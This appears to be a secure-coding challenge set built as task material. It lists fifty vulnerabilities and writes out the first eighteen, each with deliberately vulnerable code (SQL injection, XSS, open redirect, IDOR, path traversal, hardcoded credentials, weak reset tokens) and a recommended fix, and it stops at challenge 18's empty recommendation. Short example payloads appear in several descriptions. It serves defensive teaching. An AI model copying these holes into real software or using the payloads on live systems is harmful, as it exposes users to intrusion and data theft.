# Secure Coding Challenges: Vulnerability Remediation Platform

> **50 hands-on challenges** for developers to identify and fix real-world security vulnerabilities.  
> Submit your secured version of each vulnerable snippet — the AI evaluator will verify the fix preserves functionality while eliminating the vulnerability.

---

## Table of Contents

### Easy (25 Challenges)
1. [SQL Injection in Login Form](#1-sql-injection-in-login-form)
2. [Reflected XSS in Search Results](#2-reflected-xss-in-search-results)
3. [Hardcoded Database Credentials](#3-hardcoded-database-credentials)
4. [Open Redirect on Login Success](#4-open-redirect-on-login-success)
5. [Insecure Direct Object Reference on Profile Page](#5-insecure-direct-object-reference-on-profile-page)
6. [Plaintext Password Storage](#6-plaintext-password-storage)
7. [Missing CSRF Token on State-Changing Form](#7-missing-csrf-token-on-state-changing-form)
8. [Path Traversal in File Download](#8-path-traversal-in-file-download)
9. [SQL Injection in Search Filter](#9-sql-injection-in-search-filter)
10. [Sensitive Data in URL Parameters](#10-sensitive-data-in-url-parameters)
11. [Stored XSS in User Comments](#11-stored-xss-in-user-comments)
12. [Insecure Cookie Configuration](#12-insecure-cookie-configuration)
13. [Username Enumeration via Login Response](#13-username-enumeration-via-login-response)
14. [Missing Authorization Check on Admin Route](#14-missing-authorization-check-on-admin-route)
15. [Verbose Error Messages Leaking Stack Traces](#15-verbose-error-messages-leaking-stack-traces)
16. [SQL Injection in Order Sorting](#16-sql-injection-in-order-sorting)
17. [IDOR in Invoice Download](#17-idor-in-invoice-download)
18. [Insecure Password Reset Token](#18-insecure-password-reset-token)
19. [XSS via HTTP Response Header Injection](#19-xss-via-http-response-header-injection)
20. [Directory Listing Enabled on Static Server](#20-directory-listing-enabled-on-static-server)
21. [Weak Session Token Generation](#21-weak-session-token-generation)
22. [SQL Injection in Registration Email Check](#22-sql-injection-in-registration-email-check)
23. [Unvalidated File Extension on Upload](#23-unvalidated-file-extension-on-upload)
24. [API Key Exposed in Client-Side JavaScript](#24-api-key-exposed-in-client-side-javascript)
25. [Broken Access Control on User Settings](#25-broken-access-control-on-user-settings)

### Medium (15 Challenges)
26. [Server-Side Request Forgery in Webhook Tester](#26-server-side-request-forgery-in-webhook-tester)
27. [NoSQL Injection in MongoDB Authentication](#27-nosql-injection-in-mongodb-authentication)
28. [XML External Entity in Document Parser](#28-xml-external-entity-in-document-parser)
29. [Insecure JWT Verification](#29-insecure-jwt-verification)
30. [Command Injection in Network Diagnostic Tool](#30-command-injection-in-network-diagnostic-tool)
31. [Mass Assignment in User Registration](#31-mass-assignment-in-user-registration)
32. [Prototype Pollution via Query String Merge](#32-prototype-pollution-via-query-string-merge)
33. [Insecure Deserialization in Session Restore](#33-insecure-deserialization-in-session-restore)
34. [SSRF via Image Proxy Service](#34-ssrf-via-image-proxy-service)
35. [Race Condition in Coupon Redemption](#35-race-condition-in-coupon-redemption)
36. [JWT Algorithm Confusion Attack](#36-jwt-algorithm-confusion-attack)
37. [Path Traversal in ZIP Archive Extraction](#37-path-traversal-in-zip-archive-extraction)
38. [Broken Object Level Authorization in REST API](#38-broken-object-level-authorization-in-rest-api)
39. [Command Injection via PDF Generator](#39-command-injection-via-pdf-generator)
40. [Insecure Direct Object Reference in File Sharing](#40-insecure-direct-object-reference-in-file-sharing)

### Hard (10 Challenges)
41. [Second-Order SQL Injection in Profile Update](#41-second-order-sql-injection-in-profile-update)
42. [GraphQL Introspection and Authorization Bypass](#42-graphql-introspection-and-authorization-bypass)
43. [Insecure Deserialization Leading to RCE](#43-insecure-deserialization-leading-to-rce)
44. [Business Logic Flaw in Fund Transfer](#44-business-logic-flaw-in-fund-transfer)
45. [SSRF via Cloud Metadata Service](#45-ssrf-via-cloud-metadata-service)
46. [Timing Attack on API Key Verification](#46-timing-attack-on-api-key-verification)
47. [XXE with SSRF in SAML Authentication](#47-xxe-with-ssrf-in-saml-authentication)
48. [Prototype Pollution to RCE via Template Engine](#48-prototype-pollution-to-rce-via-template-engine)
49. [Race Condition in Concurrent Withdrawal System](#49-race-condition-in-concurrent-withdrawal-system)
50. [Subdomain Takeover via Dangling CNAME](#50-subdomain-takeover-via-dangling-cname)

---

## Easy Challenges

---

# 1. SQL Injection in Login Form

## Difficulty *
Easy

## Description *
A retail e-commerce company's customer portal authenticates users through a login form that accepts email and password. The backend constructs a SQL query to validate credentials. A security audit flagged that attackers could bypass authentication entirely or extract user data by manipulating the input fields.

## Programming Language
PHP

## Challenge Details
The authentication module builds a raw SQL query using user-supplied input without sanitization. An attacker can submit a crafted email such as `' OR '1'='1' --` to bypass password verification and log in as any user, including administrators. The function should authenticate users by verifying that both email and password match a record — the vulnerability allows complete authentication bypass. Your goal is to rewrite the query execution so it properly separates code from data, ensuring user input can never alter the SQL command structure.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function authenticateUser(PDO $pdo, string $email, string $password): ?array {
    $query = "SELECT id, email, role, password_hash 
              FROM users 
              WHERE email = '$email' 
              AND active = 1";

    $stmt = $pdo->query($query);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && password_verify($password, $user['password_hash'])) {
        unset($user['password_hash']);
        return $user;
    }

    return null;
}
```

## Recommendation
Apply parameterized queries (prepared statements) so that user-supplied values are always treated as data, never as SQL syntax. Bind each parameter explicitly and let the database driver handle escaping. This is the foundational defense against SQL injection and should be applied wherever user input touches a database query.

---

# 2. Reflected XSS in Search Results

## Difficulty *
Easy

## Description *
An online bookstore renders search results by echoing the user's search term back into the page as a heading ("Results for: ..."). The development team has received a bug report claiming that specially crafted URLs shared in emails can execute arbitrary JavaScript in the browser of any user who clicks them.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The Express route handler reads the `q` query parameter and injects it directly into the HTML response without encoding. An attacker can craft a URL containing `<script>alert(document.cookie)</script>` as the search term. When a victim visits that URL, the script executes in their browser session, enabling session hijacking or credential theft. The search functionality should display the user's query text safely. Your task is to ensure all dynamic content inserted into HTML is properly encoded so browsers render it as text, not markup.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const express = require('express');
const router = express.Router();

router.get('/search', (req, res) => {
    const searchTerm = req.query.q || '';
    const results = searchBooks(searchTerm); // returns array of book objects

    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Search Results</title></head>
        <body>
            <h1>Results for: ${searchTerm}</h1>
            <ul>
                ${results.map(book => `<li>${book.title} by ${book.author}</li>`).join('')}
            </ul>
        </body>
        </html>
    `);
});
```

## Recommendation
HTML-encode all user-supplied values before inserting them into HTML content. Replace characters with special meaning in HTML (`<`, `>`, `&`, `"`, `'`) with their entity equivalents. Consider using a well-tested templating engine that auto-escapes output by default, or a dedicated sanitization library. Never insert raw request data into HTML, JavaScript, or attribute contexts without context-appropriate encoding.

---

# 3. Hardcoded Database Credentials

## Difficulty *
Easy

## Description *
A logistics startup's microservice connects to its PostgreSQL database using credentials embedded directly in the source code. The repository was recently made public on GitHub for an open-source initiative, inadvertently exposing production database credentials to anyone who views the commit history.

## Programming Language
Python

## Challenge Details
The database connection function contains a hardcoded username, password, host, and database name in plaintext. Anyone with access to the codebase — including repository forks, CI logs, or container images — can extract and use these credentials to access the production database directly. The service should establish a database connection using credentials that are never stored in version control. Your task is to refactor the credential handling so that secrets are loaded from the environment or a secrets manager at runtime, not compiled into the application.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import psycopg2

def get_db_connection():
    conn = psycopg2.connect(
        host="prod-db.internal.logisticsco.com",
        port=5432,
        database="shipments_prod",
        user="app_service_user",
        password="Sup3rS3cr3tPa$$w0rd!2024"
    )
    return conn

def get_shipment(shipment_id: int):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM shipments WHERE id = %s", (shipment_id,))
    return cursor.fetchone()
```

## Recommendation
Load secrets from environment variables using `os.environ` or `os.getenv`, or integrate with a secrets management service (such as AWS Secrets Manager, HashiCorp Vault, or Azure Key Vault). Environment variables are injected at deployment time and never committed to version control. Ensure your `.gitignore` and CI configuration also prevent `.env` files from being published. The application should fail at startup with a clear error if required secrets are absent, rather than silently using defaults.

---

# 4. Open Redirect on Login Success

## Difficulty *
Easy

## Description *
A SaaS project management platform redirects users to a `next` URL after successful login, allowing deep links to specific pages. A penetration tester discovered that this redirect can be hijacked to send authenticated users to attacker-controlled phishing sites immediately after they log in, leveraging the platform's trusted domain as a launchpad.

## Programming Language
Java

## Challenge Details
After successful authentication, the controller reads a `next` parameter from the login request and redirects the browser to it unconditionally. An attacker can craft a login URL such as `/login?next=https://evil-phishing.com/fake-portal` and share it with targets. Because the redirect happens right after the user successfully logs in on the legitimate site, victims are far more likely to trust the subsequent page. The redirect logic should only send users to paths within the same application. Your task is to add validation that prevents the redirect from leaving the application's own domain.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
@PostMapping("/login")
public ResponseEntity<Void> login(
        @RequestParam String username,
        @RequestParam String password,
        @RequestParam(defaultValue = "/dashboard") String next,
        HttpServletResponse response) {

    boolean authenticated = authService.authenticate(username, password);

    if (!authenticated) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
    }

    String sessionToken = sessionService.createSession(username);
    response.addCookie(buildSessionCookie(sessionToken));

    return ResponseEntity
            .status(HttpStatus.FOUND)
            .header("Location", next)
            .build();
}
```

## Recommendation
Validate the `next` parameter against an allowlist of permitted paths or enforce that it is a relative path (starts with `/` and does not start with `//`). Reject any value containing a scheme (`http://`, `https://`) or a hostname different from your own. A safe approach is to parse the URL and verify the host matches your application's own domain, falling back to a safe default like `/dashboard` if validation fails. Never trust user-supplied redirect targets without strict validation.

---

# 5. Insecure Direct Object Reference on Profile Page

## Difficulty *
Easy

## Description *
A healthcare patient portal exposes patient profile pages at `/profile/{id}`. Authenticated users can view their own profile, but a patient discovered they could view other patients' records simply by changing the numeric ID in the URL — a serious HIPAA-relevant data exposure.

## Programming Language
Python

## Challenge Details
The profile endpoint fetches a user record by the `user_id` path parameter without checking whether the requesting user is authorized to view that record. Any authenticated user can access any other user's sensitive data — including medical history, contact details, and insurance information — by iterating through ID values. The endpoint must restrict profile access so that users can only retrieve their own record (or records they are explicitly authorized to view, such as a caregiver). Your task is to add an authorization check that ties the requested resource to the authenticated requester.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from flask import Flask, jsonify, g
from auth import require_login

app = Flask(__name__)

@app.route('/api/profile/<int:user_id>', methods=['GET'])
@require_login
def get_profile(user_id: int):
    """Return patient profile by ID."""
    user = db.session.query(User).filter_by(id=user_id, active=True).first()

    if not user:
        return jsonify({'error': 'User not found'}), 404

    return jsonify({
        'id': user.id,
        'name': user.full_name,
        'email': user.email,
        'dob': user.date_of_birth.isoformat(),
        'medical_record_number': user.mrn,
        'insurance_provider': user.insurance_provider
    })
```

## Recommendation
After fetching the resource, compare the resource's owner identifier against the authenticated user's identity (available via your session or token, e.g., `g.current_user.id`). If they do not match and the requester does not hold a privileged role (such as `admin` or `caregiver`), return a 403 Forbidden response. Never rely on the client to send only their own ID — always enforce ownership on the server side.

---

# 6. Plaintext Password Storage

## Difficulty *
Easy

## Description *
A community forum stores user passwords in a MySQL database. After a database breach, the incident response team found that all passwords were stored in plaintext, enabling the attackers to immediately compromise every user account and attempt credential stuffing against other services.

## Programming Language
PHP

## Challenge Details
The registration handler inserts the user's password directly into the database without any hashing or transformation. When the database is exfiltrated — via SQL injection, a compromised backup, or insider access — every user's password is immediately available to the attacker. Password storage must be one-way: the original password should be unrecoverable from what is stored. Your task is to replace the plaintext storage with a modern, slow password hashing algorithm that makes brute-force attacks computationally expensive even after a breach.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function registerUser(PDO $pdo, string $username, string $email, string $password): bool {
    // Check if username already exists
    $stmt = $pdo->prepare("SELECT id FROM users WHERE username = ?");
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        return false;
    }

    // Insert new user
    $stmt = $pdo->prepare(
        "INSERT INTO users (username, email, password, created_at) VALUES (?, ?, ?, NOW())"
    );
    return $stmt->execute([$username, $email, $password]);
}
```

## Recommendation
Use PHP's built-in `password_hash()` function with `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID` to hash passwords before storage. These algorithms are deliberately slow and incorporate a random salt automatically. On login, use `password_verify()` to compare the submitted password against the stored hash — never decrypt or compare hashes directly. Do not use MD5, SHA-1, SHA-256, or any general-purpose hashing algorithm for passwords; they are too fast for this purpose.

---

# 7. Missing CSRF Token on State-Changing Form

## Difficulty *
Easy

## Description *
A banking web application allows users to update their account email address via a settings form. A security researcher demonstrated that an attacker could host a hidden form on a malicious website that silently submits an email-change request using a logged-in victim's session cookies, taking over their account.

## Programming Language
Python

## Challenge Details
The account settings form and the endpoint that processes it do not implement any CSRF protection. Because browsers automatically include session cookies with cross-origin requests, a malicious page can trigger authenticated state changes on behalf of any user who visits it while logged into the bank. The email-change endpoint should only process requests that originate from the application's own forms. Your task is to implement a CSRF defense that verifies each state-changing request carries a secret token that only the legitimate application could have embedded in the form.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from flask import Flask, request, session, redirect, url_for
from auth import require_login

app = Flask(__name__)

@app.route('/settings/email', methods=['GET', 'POST'])
@require_login
def change_email():
    if request.method == 'GET':
        return '''
            <form method="POST" action="/settings/email">
                <label>New Email: <input type="email" name="new_email" required></label>
                <button type="submit">Update Email</button>
            </form>
        '''

    new_email = request.form.get('new_email')
    if new_email:
        db.update_user_email(session['user_id'], new_email)
        return redirect(url_for('settings'))

    return 'Invalid request', 400
```

## Recommendation
Generate a cryptographically random, per-session (or per-form) CSRF token and embed it as a hidden field in every state-changing form. On form submission, verify the submitted token matches the one stored in the server-side session before processing the request. Use a constant-time comparison to prevent timing attacks. Flask-WTF and similar libraries provide ready-made CSRF protection — prefer them over manual implementations. Also consider setting the `SameSite=Strict` or `SameSite=Lax` attribute on session cookies as a defense-in-depth measure.

---

# 8. Path Traversal in File Download

## Difficulty *
Easy

## Description *
A document management system allows users to download their own uploaded files via a `/download?file=filename.pdf` endpoint. A support ticket revealed that an employee accessed `/etc/passwd` and application configuration files by manipulating the `file` parameter with `../` sequences.

## Programming Language
Go

## Challenge Details
The download handler constructs a file path by joining a base upload directory with the user-supplied filename parameter. An attacker can supply a value like `../../etc/passwd` or `../config/database.yml` to escape the intended directory and read arbitrary files on the server. The handler must restrict file access to within the designated upload directory. Your task is to add path validation that prevents directory traversal regardless of how many `../` sequences or URL-encoded variants the attacker uses.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "net/http"
    "os"
    "path/filepath"
)

const uploadDir = "/var/app/uploads"

func downloadHandler(w http.ResponseWriter, r *http.Request) {
    filename := r.URL.Query().Get("file")
    if filename == "" {
        http.Error(w, "Missing file parameter", http.StatusBadRequest)
        return
    }

    filePath := filepath.Join(uploadDir, filename)

    data, err := os.ReadFile(filePath)
    if err != nil {
        http.Error(w, "File not found", http.StatusNotFound)
        return
    }

    w.Header().Set("Content-Type", "application/octet-stream")
    w.Write(data)
}
```

## Recommendation
After constructing the full path with `filepath.Join`, resolve it to its absolute canonical form using `filepath.Clean` and then verify that the resolved path starts with the `uploadDir` base directory (use `strings.HasPrefix` on the cleaned paths, ensuring the base path ends with a separator). If the resolved path escapes the base directory, reject the request immediately. Do not attempt to strip `../` sequences manually — path cleaning and prefix checking against the canonical base is the reliable approach.

---

# 9. SQL Injection in Search Filter

## Difficulty *
Easy

## Description *
An HR platform allows managers to search the employee directory by department, job title, or location using dropdown filters and a free-text box. During a routine penetration test, the tester retrieved the contents of the entire `salaries` table using a UNION-based SQL injection payload in the job title search field.

## Programming Language
Java

## Challenge Details
The search service concatenates all filter values — including the free-text query — directly into a SQL string using string formatting. UNION-based injection allows an attacker to append additional SELECT statements and retrieve data from other tables, including sensitive payroll and HR records. The search must return only employee records that match the filters. Your task is to rewrite the query construction to use parameterized statements so no user input can alter the SQL command structure.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
public List<Employee> searchEmployees(String department, String jobTitle, String location) {
    StringBuilder sql = new StringBuilder(
        "SELECT id, full_name, email, department, job_title, location " +
        "FROM employees WHERE active = true"
    );

    if (department != null && !department.isEmpty()) {
        sql.append(" AND department = '").append(department).append("'");
    }
    if (jobTitle != null && !jobTitle.isEmpty()) {
        sql.append(" AND job_title LIKE '%").append(jobTitle).append("%'");
    }
    if (location != null && !location.isEmpty()) {
        sql.append(" AND location = '").append(location).append("'");
    }

    return jdbcTemplate.query(sql.toString(), employeeRowMapper);
}
```

## Recommendation
Use `JdbcTemplate.query()` with `?` placeholders and a corresponding list of parameter values, never string concatenation. Build the parameter list alongside the SQL string using the same conditional logic. For LIKE patterns, the `%` wildcards must be added to the parameter value itself (e.g., `"%" + jobTitle + "%"`), not embedded in the SQL string. This ensures the database driver handles quoting and escaping, making injection impossible regardless of input content.

---

# 10. Sensitive Data in URL Parameters

## Difficulty *
Easy

## Description *
A healthcare appointment system sends a password reset link that includes the user's email address and a reset token as query parameters in the URL. Security reviewers noted that these values appear in browser history, server access logs, proxy logs, and the `Referer` header when users click external links — exposing credentials to unintended parties.

## Programming Language
C#

## Challenge Details
The password reset mechanism embeds the user's email in the reset URL as a query parameter alongside the token. URLs are logged extensively across web infrastructure, and the email field is redundant — the reset token alone should be sufficient to identify the user. Including sensitive identifiers in URLs violates data minimization principles and creates unnecessary exposure vectors. Your task is to refactor the reset link so that sensitive identifying information is not included as a URL query parameter, and the token alone is sufficient to locate and reset the correct account.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```csharp
public class PasswordResetService
{
    public async Task SendPasswordResetEmail(string userEmail)
    {
        var user = await _userRepository.FindByEmailAsync(userEmail);
        if (user == null) return;

        var token = GenerateResetToken();
        await _tokenRepository.StoreResetToken(user.Id, token, expiresIn: TimeSpan.FromHours(1));

        var resetUrl = $"https://app.example.com/reset-password" +
                       $"?email={Uri.EscapeDataString(userEmail)}" +
                       $"&token={Uri.EscapeDataString(token)}";

        await _emailService.SendAsync(userEmail, "Password Reset", 
            $"Click here to reset your password: {resetUrl}");
    }
}
```

## Recommendation
Design the reset token to be self-contained and globally unique — store a mapping from the token to the user record server-side so you can look up the user from the token alone. Remove the `email` parameter from the URL entirely. The reset endpoint should accept only the token, retrieve the associated user from your token store, and proceed. This eliminates email addresses from logs and browser history while maintaining full functionality. Also ensure tokens are single-use and expire after a short window.

---

# 11. Stored XSS in User Comments

## Difficulty *
Easy

## Description *
A product review platform allows customers to leave comments on product pages. A malicious actor submitted a review containing a script tag that executes in the browser of every user who subsequently views that product page, stealing session cookies and redirecting users to phishing sites.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The comment rendering function takes stored comment text and injects it directly into HTML without encoding. Because the comment was stored in the database as-is and is later reflected to all viewers, this is a persistent (stored) XSS vulnerability — more severe than reflected XSS because it affects every visitor, not just those tricked into clicking a special link. Comments should display their text content safely. Your task is to ensure that when comments are rendered into HTML, all special characters are encoded so browsers display them as text rather than interpreting them as HTML markup.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
function renderProductPage(product, comments) {
    const commentHTML = comments.map(comment => `
        <div class="comment">
            <strong>${comment.username}</strong>
            <span class="date">${comment.createdAt}</span>
            <p>${comment.text}</p>
            <small>Rating: ${comment.rating}/5</small>
        </div>
    `).join('');

    return `
        <div class="product">
            <h1>${product.name}</h1>
            <p>${product.description}</p>
            <section class="comments">
                <h2>Customer Reviews</h2>
                ${commentHTML}
            </section>
        </div>
    `;
}
```

## Recommendation
Write or import an HTML escape function that converts `&`, `<`, `>`, `"`, `'`, and `/` to their HTML entity equivalents, then apply it to every user-supplied value before inserting it into the template: `comment.username`, `comment.text`, `comment.rating`, and `comment.createdAt`. Alternatively, switch to a templating engine (Handlebars, EJS with `<%=`, Nunjucks with autoescape enabled) that performs escaping automatically. Apply escaping at the rendering layer — not at storage time — to preserve the raw data for future use.

---

# 12. Insecure Cookie Configuration

## Difficulty *
Easy

## Description *
A financial services web portal sets session cookies that are accessible to JavaScript and transmitted over both HTTP and HTTPS. During an XSS audit, testers confirmed that any script injection could access the session cookie via `document.cookie`. Additionally, network analysis at a coffee shop confirmed the cookie was sent over plain HTTP during a redirect.

## Programming Language
Python

## Challenge Details
The session cookie is created without the `HttpOnly`, `Secure`, or `SameSite` attributes. Without `HttpOnly`, any JavaScript on the page (including injected scripts) can read the cookie. Without `Secure`, the browser will send the cookie over unencrypted HTTP connections. Without `SameSite`, the cookie is included in cross-site requests, enabling CSRF. The session management must protect the session token from XSS exfiltration, network interception, and cross-site request misuse. Your task is to configure the cookie with the attributes that address all three risks.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from flask import Flask, make_response, request
import uuid

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if auth_service.verify(username, password):
        session_token = str(uuid.uuid4())
        session_store.save(session_token, username)

        response = make_response({'status': 'ok'})
        response.set_cookie('session_id', session_token)
        return response

    return {'error': 'Invalid credentials'}, 401
```

## Recommendation
Set the `HttpOnly=True` flag to prevent JavaScript access to the cookie. Set `Secure=True` to ensure it is only transmitted over HTTPS. Set `SameSite='Strict'` (or `'Lax'` for flows that need cross-site navigation) to limit cross-site submission. Additionally, set a reasonable `max_age` or `expires` value rather than leaving the cookie as a session cookie. In Flask, these are parameters on `set_cookie()`. Combine cookie hardening with Content Security Policy headers for layered XSS defense.

---

# 13. Username Enumeration via Login Response

## Difficulty *
Easy

## Description *
An enterprise SaaS application returns different error messages for failed login attempts depending on whether the username exists: "User not found" vs. "Incorrect password." An attacker automated requests against the endpoint and enumerated thousands of valid employee email addresses, which were subsequently used in a targeted phishing campaign.

## Programming Language
Go

## Challenge Details
The authentication handler checks for the user's existence first and returns a distinct error message when no user is found, versus a different message when the password is wrong. This difference in responses allows an attacker to systematically confirm which email addresses have accounts, even without knowing any passwords. Authentication failure responses must be indistinguishable regardless of whether the username exists or the password is wrong. Your task is to unify error responses so they reveal no information about which part of the check failed.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
func loginHandler(w http.ResponseWriter, r *http.Request) {
    email := r.FormValue("email")
    password := r.FormValue("password")

    user, err := userStore.FindByEmail(email)
    if err != nil || user == nil {
        http.Error(w, `{"error": "User not found"}`, http.StatusUnauthorized)
        return
    }

    if !checkPasswordHash(password, user.PasswordHash) {
        http.Error(w, `{"error": "Incorrect password"}`, http.StatusUnauthorized)
        return
    }

    token := createSessionToken(user.ID)
    writeJSON(w, map[string]string{"token": token})
}
```

## Recommendation
Return an identical generic error message — such as "Invalid email or password" — for all authentication failures, regardless of whether the user was not found or the password was wrong. Also consider performing the password hash check even when no user is found (using a dummy hash) to prevent timing-based enumeration, where a faster response for "user not found" gives it away. Apply the same response time and body to all failure paths to prevent both message-based and timing-based enumeration.

---

# 14. Missing Authorization Check on Admin Route

## Difficulty *
Easy

## Description *
An e-learning platform has an admin panel accessible at `/admin/users` that lists all registered users and their personal data. A student discovered the endpoint by inspecting JavaScript bundle files and accessed the full user list without any error — the application only checked that the user was logged in, not that they were an administrator.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The admin route is protected by an authentication middleware that verifies the user is logged in but does not verify the user's role. Any authenticated user — including regular students — can access admin-only data. Authentication (are you who you say you are?) and authorization (are you allowed to do this?) are separate concerns, and both must be enforced. Your task is to add an authorization check that verifies the requesting user holds the `admin` role before serving the protected resource.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const express = require('express');
const router = express.Router();
const { requireAuth } = require('../middleware/auth');

// Admin panel - list all users
router.get('/admin/users', requireAuth, async (req, res) => {
    try {
        const users = await db.query(
            'SELECT id, email, full_name, role, created_at, last_login FROM users ORDER BY created_at DESC'
        );
        res.json({ users: users.rows, total: users.rowCount });
    } catch (err) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
```

## Recommendation
Add a role-based authorization check after the authentication middleware. Access `req.user.role` (populated by your auth middleware) and verify it equals `'admin'` (or whatever your admin role identifier is) before proceeding. Return `403 Forbidden` if the check fails — not `401 Unauthorized`, which implies the user is not logged in. Extract this into a reusable `requireRole('admin')` middleware so it can be applied consistently across all admin routes.

---

# 15. Verbose Error Messages Leaking Stack Traces

## Difficulty *
Easy

## Description *
A production REST API returns full Java stack traces, internal class names, SQL query fragments, and database table structures in error responses when exceptions occur. A bug bounty hunter used these details to identify the exact database schema and ORM framework, accelerating their attack by several hours.

## Programming Language
Java

## Challenge Details
The global exception handler catches all unhandled exceptions and returns their full string representation — including the exception message, class names, method signatures, line numbers, and any embedded SQL or configuration data — directly in the HTTP response body. This information is invaluable to attackers mapping the application's internal structure. Error responses should be informative enough for legitimate clients to understand that a failure occurred, but must not reveal implementation internals. Your task is to create a safe error response structure that logs full details server-side while returning only a safe, generic message to the client.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(Exception.class)
    public ResponseEntity<Map<String, Object>> handleAllExceptions(
            Exception ex, HttpServletRequest request) {

        Map<String, Object> errorResponse = new HashMap<>();
        errorResponse.put("error", ex.getMessage());
        errorResponse.put("exception", ex.getClass().getName());
        errorResponse.put("stackTrace", Arrays.toString(ex.getStackTrace()));
        errorResponse.put("path", request.getRequestURI());
        errorResponse.put("timestamp", System.currentTimeMillis());

        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(errorResponse);
    }
}
```

## Recommendation
Log the full exception details (message, class, and stack trace) to your server-side logging system (SLF4J/Logback, etc.) at ERROR level, including a generated correlation ID. Return to the client only a generic message such as "An unexpected error occurred" along with the same correlation ID, which can be used to look up the specific error in logs without exposing details to the client. Never include stack traces, class names, SQL, or file paths in HTTP responses in any environment.

---

# 16. SQL Injection in Order Sorting

## Difficulty *
Easy

## Description *
An inventory management system lets warehouse staff sort order lists by clicking column headers. The sort column and direction (`ASC`/`DESC`) are passed as query parameters. A tester found they could inject SQL through the sort column parameter, ultimately extracting data from the credentials table via a time-based blind injection.

## Programming Language
Python

## Challenge Details
The query builder inserts the `sort_by` and `order` parameters directly into the SQL ORDER BY clause. Parameterized queries cannot be used for column names and sort direction in standard SQL, which leads developers to use string formatting — creating an injection point. The risk is as serious as WHERE-clause injection; ORDER BY injection can be used for blind data extraction. Your task is to validate the sort parameters against a strict allowlist before including them in the query.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from flask import Flask, request, jsonify
import psycopg2

app = Flask(__name__)

@app.route('/api/orders', methods=['GET'])
def get_orders():
    sort_by = request.args.get('sort_by', 'created_at')
    order = request.args.get('order', 'DESC')

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        f"SELECT id, customer_name, total, status, created_at "
        f"FROM orders "
        f"ORDER BY {sort_by} {order}"
    )
    rows = cursor.fetchall()
    return jsonify(rows)
```

## Recommendation
Define an explicit allowlist of permitted column names (e.g., `{'created_at', 'total', 'status', 'customer_name'}`) and an allowlist for sort direction (`{'ASC', 'DESC'}`). Validate incoming parameters against these sets and substitute safe defaults if the value is not in the allowlist. Use the validated values — never the raw input — when constructing the ORDER BY clause. Because column names cannot be parameterized, allowlist validation is the only safe mechanism here.

---

# 17. IDOR in Invoice Download

## Difficulty *
Easy

## Description *
A freelance billing platform generates invoice PDFs accessible via `/invoices/download/{invoice_id}`. A freelancer discovered they could download invoices belonging to other clients by incrementing the numeric invoice ID, exposing confidential billing details, company names, and payment history of competitors.

## Programming Language
C#

## Challenge Details
The invoice download controller fetches the invoice record from the database using only the `invoice_id` from the URL, without checking whether the authenticated user is the owner of that invoice. Sequential numeric IDs make enumeration trivial. The download must be restricted to the invoice's rightful owner (or an authorized administrator). Your task is to add an ownership check that compares the invoice's `UserId` with the authenticated user's identity before serving the file.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```csharp
[HttpGet("invoices/download/{invoiceId}")]
[Authorize]
public async Task<IActionResult> DownloadInvoice(int invoiceId)
{
    var invoice = await _invoiceRepository.GetByIdAsync(invoiceId);

    if (invoice == null)
    {
        return NotFound();
    }

    var pdfBytes = await _pdfService.GenerateInvoicePdf(invoice);
    return File(pdfBytes, "application/pdf", $"invoice-{invoiceId}.pdf");
}
```

## Recommendation
After retrieving the invoice, compare `invoice.UserId` with the current user's ID obtained from `User.FindFirstValue(ClaimTypes.NameIdentifier)` or your identity service. If they do not match (and the requester is not an admin), return `403 Forbidden`. Alternatively, scope your repository query to include the user's ID as a filter condition so that a mismatch results in a null record and a 404 — this avoids confirming whether the invoice exists at all. Using non-guessable identifiers (UUIDs) adds defense in depth but does not replace authorization checks.

---

# 18. Insecure Password Reset Token

## Difficulty *
Easy

## Description *
A travel booking platform's password reset feature generates tokens using a predictable algorithm — the current Unix timestamp combined with the user's email address, run through MD5. A researcher was able to calculate valid reset tokens for arbitrary accounts by knowing (or guessing) when a reset was requested, allowing account takeover without user interaction.

## Programming Language
PHP

## Challenge Details
The reset token is derived from the current timestamp and the user's email using `md5()`. MD5 is a fast cryptographic hash not suited for security tokens; and the inputs (timestamp and email) are partially or fully known to an attacker. The resulting token space is small enough to brute force or calculate outright. Password reset tokens must be unpredictable, unguessable, and time-limited. Your task is to replace the token generation logic with cryptographically secure random token generation.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function generatePasswordResetToken(string $email): string {
    $timestamp = time();
    $token = md5($email . $timestamp);

    $pdo = getDbConnection();
    $stmt = $pdo->prepare(
        "UPDATE users SET reset_token = ?, reset_expires = DATE_ADD(NOW(), INTERVAL 1 HOUR) WHERE email = ?"
    );
    $stmt->execute([$token, $email]);

    return $token;
}
```

## Recommendation
